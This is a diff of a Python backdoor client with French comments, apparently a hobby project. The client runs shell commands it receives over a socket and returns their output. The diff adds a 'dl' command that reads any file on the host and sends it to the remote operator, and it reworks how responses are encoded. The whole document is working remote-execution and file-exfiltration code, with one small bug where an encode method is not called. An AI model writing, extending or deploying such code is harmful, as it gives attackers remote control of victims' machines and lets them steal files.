@@ -6,7 +6,6 @@
 # close
 
 import socket
-from sys import platform 
 import time 
 import subprocess
 import platform 
@@ -43,6 +42,7 @@ while True:
 
     if commande == "infos":
         reponse= platform.platform() +" " + os.getcwd()
+        reponse = reponse.encode()
          
     elif len(commande_split) ==2  and commande_split[0] =="cd":
         try:
@@ -50,6 +50,15 @@ while True:
             reponse = " "
         except FileNotFoundError:
             reponse = "ERREUR : ce répertoire n'existe pas"
+        reponse = reponse.encode()
+    elif len(commande_split) ==2  and commande_split[0] =="dl":
+        try:
+            f = open(commande_split[1], "rb")
+        except FileNotFoundError:
+            reponse = " ".encode
+        else:
+            reponse = f.read()
+            f.close()
     else:
         resultat = subprocess.run(commande,shell=True,
         capture_output=True, universal_newlines=True)
@@ -57,13 +66,15 @@ while True:
 
         if not reponse or len(reponse)==0:
             reponse = " "
+        reponse = reponse.encode()
 
-    data_len = len(reponse.encode())
-    header = str(len(reponse.encode())).zfill(13)
+    # reponse est déjà encodé
+    data_len = len(reponse)
+    header = str(data_len).zfill(13)
     print('header:', header)
     s.sendall(header.encode())  
     if data_len > 0 :  
-        s.sendall(reponse.encode())
+        s.sendall(reponse)
 
 s.close()
 
